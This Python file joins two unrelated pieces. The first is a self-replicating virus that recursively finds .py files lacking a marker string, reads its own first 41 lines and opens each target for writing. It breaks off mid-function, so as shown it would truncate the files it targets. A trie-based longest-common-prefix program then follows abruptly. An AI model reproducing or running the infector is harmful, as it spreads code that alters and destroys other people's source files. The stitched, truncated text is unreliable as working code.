#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python 3 program to find the longest common prefix
ALPHABET_SIZE = 26
indexs = 0
class TrieNode:
    # constructor
    def __init__(self):
        self.isLeaf = False
        self.children = [None]*ALPHABET_SIZE
  
# Function to facilitate insertion in Trie
# If not present, insert the node in the Trie
def insert(key, root):
    pCrawl = root
    for level in range(len(key)):
        index = ord(key[level]) - ord('a')
        if pCrawl.children[index] == None:
            pCrawl.children[index] = TrieNode()
        pCrawl = pCrawl.children[index]
    pCrawl.isLeaf = True
  
# Function to construct Trie
def constructTrie(arr, n, root):
    for i in range(n):
        insert(arr[i], root)
  
# Counts and returns number of children of the node
def countChildren(node):
    count = 0
    for i in range(ALPHABET_SIZE):
        if node.children[i] != None:
            count +=1
            # Keeping track of diversion in the trie
            global indexs
            indexs = i
    return count
      
# Perform walk on trie and return longest common prefix 
def walkTrie(root):
    pCrawl = root
    prefix = ""
    while(countChildren(pCrawl) == 1 and pCrawl.isLeaf == False):
        pCrawl = pCrawl.children[indexs]
        prefix += chr(97 + indexs)
    return prefix or -1
  
# Function that returns longest common prefix 
def commonPrefix(arr, n, root):
    constructTrie(arr, n, root)
    return walkTrie(root)
  
# Driver code to test the code
n = 4
arr = ["geeksforgeeks", "geeks", "geek", "geezer"]
root = TrieNode()
print(commonPrefix(arr,n, root))
  
# This code is Contributed by Akshay Jain (DA-IICT)
# Time Complexity: O(MN) where N = number of strings and M = Length of the largest string
# Space Complexity - O(26 * M * N)